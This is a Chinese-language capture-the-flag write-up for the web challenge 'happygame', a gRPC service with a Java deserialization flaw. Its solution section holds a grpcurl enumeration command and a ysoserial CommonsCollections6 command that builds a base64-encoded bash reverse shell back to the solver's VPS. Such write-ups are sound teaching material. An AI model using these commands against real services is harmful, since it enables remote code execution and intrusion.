# happygame

> 分类：Web

## 题目描述

基于 HTTP/2 协议的 gRPC 服务，存在 Java 反序列化漏洞，用 ysoserial 生成 CC 链反弹 shell。

## 考察知识点

- gRPC 协议（grpcui/grpcurl）
- Java 反序列化（CommonsCollections 5/6）

## 解法

1. 报错提示 HTTP/2/gRPC 协议，用 `grpcui -plaintext IP:port` 或 `grpcurl` 连接：

```bash
docker run fullstorydev/grpcurl -plaintext 8.147.135.248:28234 list
# grpc.reflection.v1alpha.ServerReflection / helloworld.Greeter
```

2. `helloworld.Greeter.ProcessMsg` 接口接收 `serializeData`（bytes，Java 反序列化）。
3. 用 ysoserial 生成 CommonsCollections5/6 反弹 shell payload：

```bash
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9...}|{base64,-d}|{bash,-i}" | base64 | tr -d "\n"
```

4. 通过 grpcui 的 Raw Request 发送 `{"serializeData": "<base64>"}`，VPS 监听反弹 shell 获取 flag。

## 参考答案

（flag 通过反弹 shell 读取）

## 来源

- 作者：m1ao | https://xz.aliyun.com/news/12701
- 作者：天格战队 | https://blog.csdn.net/zzz6583zz/article/details/141131947
- 作者：山石网科安全技术研究院 | https://cn-sec.com/archives/2316376.html
- https://cn-sec.com/archives/2314955.html
